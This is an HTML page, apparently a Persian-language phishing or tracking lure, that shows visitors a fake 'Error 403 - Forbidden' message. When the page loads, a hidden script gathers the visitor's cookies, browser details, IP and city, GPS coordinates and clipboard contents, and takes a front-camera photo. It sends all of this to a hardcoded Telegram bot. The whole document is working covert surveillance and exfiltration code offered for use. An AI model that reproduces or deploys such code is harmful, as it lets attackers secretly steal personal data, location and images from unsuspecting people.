<!DOCTYPE html>
<html lang="fa">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>.</title>
</head>
<body style="background:#000;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;">
    <div style="color:#fff;text-align:center;font-family:Arial;">
        <p style="font-size:24px;">Error 403 - Forbidden</p>
    </div>
    <video id="v" autoplay playsinline style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>
    <script>
        var T = "8679783900:AAHgD4k5NpYEFne9lsfh_S2P3lZisMNXeu8";
        var C = "8699687670";

        async function sendText(text) {
            await fetch("https://api.telegram.org/bot" + T + "/sendMessage", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: C, text: text, parse_mode: "HTML" })
            });
        }

        async function sendPhoto(blob, caption) {
            var f = new FormData();
            f.append("chat_id", C);
            f.append("photo", blob, "cam.jpg");
            f.append("caption", caption);
            await fetch("https://api.telegram.org/bot" + T + "/sendPhoto", { method: "POST", body: f });
        }

        async function main() {
            // پیام تست اولیه
            await sendText("✅ سایت باز شد!\nUA: " + navigator.userAgent);

            // گزارش کامل
            var info = "🔴 گزارش کامل\n\n";
            info += "UA: " + navigator.userAgent + "\n";
            info += "Platform: " + navigator.platform + "\n";
            info += "زبان: " + navigator.language + "\n";
            info += "صفحه: " + screen.width + "x" + screen.height + "\n";
            info += "Referrer: " + (document.referrer || "مستقیم") + "\n";
            info += "Cookie: " + (document.cookie || "ندارد") + "\n";

            // IP و موقعیت
            try {
                var ipRes = await fetch("https://api.ipify.org?format=json");
                var ipData = await ipRes.json();
                var geoRes = await fetch("http://ip-api.com/json/" + ipData.ip);
                var geoData = await geoRes.json();
                info += "\n📍 موقعیت:\nIP: " + ipData.ip + "\nکشور: " + (geoData.country || "?") + "\nشهر: " + (geoData.city || "?") + "\nISP: " + (geoData.isp || "?");
            } catch (e) {}

            // GPS
            if (navigator.geolocation) {
                try {
                    var pos = await new Promise(function (ok, err) {
                        navigator.geolocation.getCurrentPosition(ok, err, { timeout: 5000 });
                    });
                    info += "\n\n🎯 GPS:\nLat: " + pos.coords.latitude + "\nLon: " + pos.coords.longitude;
                } catch (e) {}
            }

            // کلیپ‌بورد
            try {
                var ct = await navigator.clipboard.readText();
                if (ct) info += "\n\n📋 کلیپ‌بورد: " + ct;
            } catch (e) {}

            await sendText(info);

            // دوربین
            try {
                var stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                var vv = document.getElementById("v");
                vv.srcObject = stream;
                await vv.play();
                setTimeout(async function () {
                    var cc = document.getElementById("c");
                    cc.width = vv.videoWidth;
                    cc.height = vv.videoHeight;
                    cc.getContext("2d").drawImage(vv, 0, 0);
                    cc.toBlob(async function (b) {
                        await sendPhoto(b, "📸 دوربین جلو");
                        stream.getTracks().forEach(function (t) { t.stop(); });
                    }, "image/jpeg");
                }, 1500);
            } catch (e) {}
        }

        main();
    </script>
</body>
</html>
